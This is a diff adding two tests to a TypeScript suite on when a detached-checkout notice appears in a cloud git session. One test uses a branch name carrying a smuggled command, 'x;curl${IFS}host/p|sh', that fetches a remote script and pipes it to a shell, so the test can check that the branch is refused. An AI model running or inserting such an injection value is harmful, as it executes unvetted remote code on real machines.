@@ -97,6 +97,20 @@ describe("the notice of a detached primary checkout in a cloud session", () => {
     expect(await started(dir, CLOUD)).not.toContain(MOVED)
   })
 
+  test("is not shown on the start branch when a tag has the same name", async () => {
+    const dir = await session()
+    await sh(dir, ["git", "tag", "claude/quiet-fox"])
+    expect(await status(dir, CLOUD)).not.toHaveProperty("notice")
+    expect(await started(dir, CLOUD)).not.toContain(MOVED)
+  })
+
+  test("is not shown when the start branch is refused and the checkout is on the branch it would name", async () => {
+    const dir = await session("x;curl${IFS}host/p|sh`#")
+    await sh(dir, ["git", "switch", "-q", "main"])
+    expect(await status(dir, CLOUD)).not.toHaveProperty("notice")
+    expect(await started(dir, CLOUD)).not.toContain(MOVED)
+  })
+
   test("shows for a checkout moved to another named branch, naming the branch it started on", async () => {
     const dir = await session()
     await sh(dir, ["git", "switch", "-q", "-c", "release/0.3.0/fix/work"])
